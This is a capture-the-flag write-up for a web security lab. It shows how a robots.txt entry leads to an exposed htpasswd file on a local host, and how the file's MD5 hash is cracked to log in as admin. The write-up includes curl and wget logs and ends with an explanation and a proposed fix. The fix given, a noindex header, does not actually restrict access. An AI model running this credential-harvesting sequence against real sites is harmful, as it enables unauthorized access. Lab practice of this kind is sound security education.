# Admin(htpasswd)

If we go to <http://192.168.31.135/robots.txt> we will find 2 folders disallowed - `/whatever` and `/.hidden`.  
Let's check <http://192.168.31.135/whatever/>

```
daniseed@DESKTOP:~/darkly$  curl -v 192.168.31.135/whatever/
*   Trying 192.168.31.135:80...
* TCP_NODELAY set
* Connected to 192.168.31.135 (192.168.31.135) port 80 (#0)
> GET /whatever/ HTTP/1.1
> Host: 192.168.31.135
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.4.6 (Ubuntu)
< Date: Tue, 09 May 2023 17:25:44 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
<
<html>
<head><title>Index of /whatever/</title></head>
<body bgcolor="white">
<h1>Index of /whatever/</h1><hr><pre><a href="../">../</a>
<a href="htpasswd">htpasswd</a>                                           29-Jun-2021 18:09                  38
</pre><hr></body>
</html>
* Connection #0 to host 192.168.31.135 left intact


*   Trying 192.168.31.135:80...
* TCP_NODELAY set
* Connected to 192.168.31.135 (192.168.31.135) port 80 (#0)
> GET /whatever/htpasswd HTTP/1.1
> Host: 192.168.31.135
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.4.6 (Ubuntu)
< Date: Tue, 09 May 2023 17:26:29 GMT
< Content-Type: application/octet-stream
< Content-Length: 38
< Last-Modified: Tue, 29 Jun 2021 18:09:05 GMT
< Connection: keep-alive
< ETag: "60db61c1-26"
< Accept-Ranges: bytes
<
root:437394baff5aa33daa618be47b75cb49
* Connection #0 to host 192.168.31.135 left intact
```

OR

```
daniseed@DESKTOP:~/darkly$ wget http://192.168.31.135/whatever/htpasswd
--2023-05-09 18:05:11--  http://192.168.31.135/whatever/htpasswd
Connecting to 192.168.31.135:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 38 [application/octet-stream]
Saving to: ‘htpasswd’

htpasswd                          100%[==========================================================>]      38  --.-KB/s    in 0s

2023-05-09 18:05:11 (2.11 MB/s) - ‘htpasswd’ saved [38/38]



daniseed@DESKTOP:~/darkly$ cat htpasswd
root:437394baff5aa33daa618be47b75cb49
```

We have login-password combination: `root:437394baff5aa33daa618be47b75cb49`

But it doesn't work on its own. So lets try and dehash it with [crackstation](https://crackstation.net/).
The password is encrypted with md5 - `qwerty123@`

Input this on <http://192.168.31.135/admin/> and we have our flag

## Explanation

Attack type: [Information exposure](https://cwe.mitre.org/data/definitions/200.html): robots.txt

> The file robots.txt is used to give instructions to web robots, such as search engine crawlers, about locations within the web site that robots are allowed, or not allowed, to crawl and index. It is often used to identify restricted or private areas of a site's contents. The information in the file may therefore help an attacker to map out the site's contents, especially if some of the locations identified are not linked from elsewhere in the site. If the application relies on robots.txt to protect access to these areas, and does not enforce proper access control over them, then this presents a serious vulnerability. [more](https://portswigger.net/kb/issues/00600600_robots-txt-file)

So the robots.txt file is often used as a primary source of information about hidden areas of the web site.

## How to fix it

>  You should not assume that all web robots will honor the file's instructions. Rather, assume that attackers will pay close attention to any locations identified in the file. Do not rely on robots.txt to provide any kind of protection over unauthorized access.

By adding this code to .htaccess file we can close robots.txt from indexing and following the hyperlink
```
<FilesMatch "robots.txt">
	Header set X-Robots-Tag "noindex, nofollow"
</FilesMatch>
```
